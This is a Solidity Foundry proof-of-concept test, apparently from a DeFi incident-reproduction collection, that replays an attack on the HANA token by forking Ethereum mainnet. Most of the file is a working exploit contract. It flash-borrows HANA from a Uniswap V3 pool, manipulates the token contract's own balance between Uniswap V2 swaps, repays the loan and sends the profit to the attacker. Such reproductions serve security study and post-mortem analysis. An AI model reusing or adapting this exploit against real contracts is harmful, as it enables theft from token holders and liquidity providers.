pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 283 USD
// Attacker : https://etherscan.io/address/0x7248939f65bdd23aab9eaab1bc4a4f909567486e
// Attack Contract : https://etherscan.io/address/0xbdb0bc0941ba81672593cd8b3f9281789f2754d1
// Vulnerable Contract : https://etherscan.io/address/0xb3912b20b3abc78c15e85e13ec0bf334fbb924f7
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0xe8cee3450545a865b4a8fffd93938ae93429574dc8e01b02bc6a02f2f4490e4e

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xb3912b20b3abc78c15e85e13ec0bf334fbb924f7

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1838963740731203737
// Twitter Guy : https://x.com/TenArmorAlert/status/1838963740731203737
// Hacking God : N/A

address constant UniswapV3Pool = 0xf3cB07A3e57bf69301c3A51D8aC87427c53Aa357;
address constant weth9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant HANA = 0xB3912b20b3aBc78C15e85E13EC0bF334fbB924f7;
address constant addr1 = 0xBdb0bc0941BA81672593Cd8B3F9281789F2754D1;
address constant attacker = 0x7248939f65bdd23Aab9eaaB1bc4A4F909567486e;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 20827436);
        deal(attacker, 3.9e-16 ether);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        attC.attack{value: 3.9e-16 ether}();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0xBdb0bc0941BA81672593Cd8B3F9281789F2754D1
contract AttackerC {
    // entry
    function attack() public payable {
        // check token0 == HANA, then flash from UniswapV3Pool
        address t0 = IUniswapV3Pool(UniswapV3Pool).token0();
        if (t0 == HANA) {
            // abi.encodePacked(HANA, 100000000000000001, UniswapV3Pool, 1, 200153617922546735, 0)
            bytes memory data = bytes.concat(
                bytes20(bytes20(HANA)),
                bytes32(uint256(100000000000000001)),
                bytes20(bytes20(UniswapV3Pool)),
                bytes32(uint256(1)),
                bytes32(uint256(200153617922546735)),
                bytes32(uint256(0))
            );
            IUniswapV3Pool(UniswapV3Pool).flash(address(this), 200153617922546735, 0, data);
        }
        // unwrap any WETH to ETH
        uint256 wbal = IWETH9(weth9).balanceOf(address(this));
        if (wbal > 0) {
            IWETH9(weth9).withdraw(wbal);
            if (address(this).balance >= 108334790875911824) {
                payable(tx.origin).transfer(108334790875911824);
            }
        }
    }

    // Uniswap V3 flash callback
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata) external {
        fee0; fee1; // silence warnings
        uint256 balThis = IHANA(HANA).balanceOf(address(this));
        uint256 balToken = IHANA(HANA).balanceOf(HANA);
        if (balToken < 100000000000000001) {
            if ((100000000000000001 - balToken) < balThis && balThis >= 100000000000000001) {
                uint256 amountIn = balThis + balToken - 200000000000000002;
                IHANA(HANA).approve(UniswapV2Router02, amountIn);
                IUniswapV2Router02(UniswapV2Router02).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    amountIn,
                    0,
                    _buildPath(HANA, weth9),
                    address(this),
                    block.timestamp + 1
                );
                uint256 hanaBalContract = IHANA(HANA).balanceOf(HANA);
                if (hanaBalContract < 100000000000000001) {
                    IHANA(HANA).transfer(HANA, 100000000000000002 - hanaBalContract);
                    uint256 balAfter = IHANA(HANA).balanceOf(address(this));
                    IHANA(HANA).approve(UniswapV2Router02, balAfter);
                    IUniswapV2Router02(UniswapV2Router02).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        balAfter,
                        0,
                        _buildPath(HANA, weth9),
                        address(this),
                        block.timestamp + 1
                    );
                    uint256 wbal2 = IWETH9(weth9).balanceOf(address(this));
                    IWETH9(weth9).approve(UniswapV2Router02, wbal2);
                    IUniswapV2Router02(UniswapV2Router02).swapTokensForExactTokens(
                        202155154101772203,
                        wbal2,
                        _buildPath(weth9, HANA),
                        address(this),
                        block.timestamp + 1
                    );
                    // repay flash: transfer HANA back to pool
                    uint256 hb = IHANA(HANA).balanceOf(address(this));
                    if (hb >= 202155154101772203) {
                        IHANA(HANA).transfer(UniswapV3Pool, 202155154101772203);
                    }
                }
            }
        }
    }

    function _buildPath(address a, address b) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = a;
        path[1] = b;
    }

    fallback() external payable {}
    receive() external payable {}
}

interface IUniswapV3Pool {
	function token0() external view returns (address);
	function flash(address, uint256, uint256, bytes calldata) external; 
}
interface IWETH9 {
	function balanceOf(address) external view returns (uint256);
	function approve(address, uint256) external returns (bool);
	function withdraw(uint256) external; 
}
interface IUniswapV2Router02 {
	function swapTokensForExactTokens(uint256, uint256, address[] calldata, address, uint256) external returns (uint256[] memory);
	function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256, uint256, address[] calldata, address, uint256) external; 
}
interface IHANA {
	function balanceOf(address) external view returns (uint256);
	function approve(address, uint256) external returns (bool);
	function transfer(address, uint256) external returns (bool); 
}